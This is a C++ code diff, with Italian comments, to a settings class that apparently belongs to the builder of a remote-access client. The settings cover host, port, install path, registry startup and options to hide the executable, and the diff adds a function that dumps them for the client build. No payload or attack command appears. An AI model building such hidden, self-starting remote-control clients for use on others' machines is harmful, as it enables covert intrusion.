@@ -140,11 +140,11 @@ private:
 
 	void InitSettings()
 	{
-		if (!sf.CheckSetting("Port"))
-			sf.SetSetting("Port", to_string(Porta));
-
 		if (!sf.CheckSetting("Host"))
 			sf.SetSetting("Host", Host);
+
+		if (!sf.CheckSetting("Port"))
+			sf.SetSetting("Port", to_string(Porta));
 
 		if (!sf.CheckSetting("InstallPath"))
 			sf.SetSetting("InstallPath", InstallPath);
@@ -188,8 +188,8 @@ public:
 		if (!sf.CheckFile())
 			return false;
 
-		Porta = stoi(sf.GetSetting("Port"));
 		Host = sf.GetSetting("Host");
+		Porta = stoi(sf.GetSetting("Port"));
 		InstallPath = sf.GetSetting("InstallPath");
 		ExeName = sf.GetSetting("ExeName");
 		RegStartup = (sf.GetSetting("RegStartup") == "true");
@@ -200,14 +200,25 @@ public:
 		return true;
 	}
 
+	// Restituisce i settaggi per il client in stringa
+	string DumpSettingsForBuild()
+	{
+		string Dump = sf.Buff;
+
+		Dump.erase(Dump.find("[HideExe]"), Dump.find("\\;", Dump.find("[HideExe]")) + 2 - Dump.find("[HideExe]"));
+		Dump.erase(Dump.find("[SystemFile]"), Dump.find("\\;", Dump.find("[SystemFile]")) + 2 - Dump.find("[SystemFile]"));
+
+		return Dump;
+	}
+
 	// Scrive i settaggi su file
 	bool SetSettings()
 	{
 		if (!sf.CheckFile())
 			return false;
 
-		sf.SetSetting("Port", to_string(Porta));
 		sf.SetSetting("Host", Host);
+		sf.SetSetting("Port", to_string(Porta));
 		sf.SetSetting("InstallPath", InstallPath);
 		sf.SetSetting("ExeName", ExeName);
 		sf.SetSetting("RegStartup", (RegStartup) ? "true" : "false");
